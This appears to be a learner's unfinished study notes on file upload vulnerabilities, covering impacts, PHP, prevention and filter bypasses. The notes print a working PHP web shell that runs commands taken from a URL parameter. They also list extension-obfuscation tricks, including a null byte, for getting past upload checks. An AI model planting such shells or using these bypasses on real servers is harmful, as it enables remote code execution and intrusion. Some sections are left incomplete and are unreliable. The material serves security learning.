# What is a upload vulnerability 

File upload vulns occur when a web server allows users to upload files to its file system without sufficently valudating things like their name type and contents 

This means tha even basic image uploads can be used to attack a system 

this could even include server-side script files that enable remote code execution 

# impacts 

- depents on 2 factors 
	- the 
- worst case: the fule type isnt validated properly and the server allows files such as .php and .jsp to be executed 
- if the filename isnt validated properly, this could allow an attcker to overwrite critical fules simply by uploading a file with the same name 
- failing to validate the size of the file could also enable a of DOS attack whereby the attacker fill all avalible space on the system 

# How do they arise 

- it is usally when a webise doesnt have restictions on what a user can upload 


# PHP

- PHP is a free highly popular open source scripting language 
- PHP scripts are executed on the server to:
	- Generate 

# Web Shell
- A webshell is a malucuious script that enables an attacker to do [[RCE]] via http

this code is a "one hit"

```PHP
<?php
	echo
	file_get_contents('path/to/bash/');
?>
```


This is taking a permitter from an unput field ie URL
where the `command='id'` is present 

```php
<?php
echo system($_GET['command']);
?>
```

# preventing Upload vulns

- check files extension 
- make sure that the file name doesn't contain substrings that may  be interoperated as file traversery 
- reanme uploaded files to advoud collisions that may cause existing files to be over written 
- do not upload files to a permanent file system 

# bypassing security 

- Flawed  validation 
	- only jpg
- preventing file execution in specific directory 
	- use path traversal 
- obfuscating file extensions
	- if .php is blocked 
		- use `.php3`, `.phtml` or  (php files can have diffrent extensions)
		- `.php.blah` (ignore last extension and read the `.php`)
		- `.php%00.jpeg` (null byte)
		- `.p.phphp` (nested)
### Hack Tricks
https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html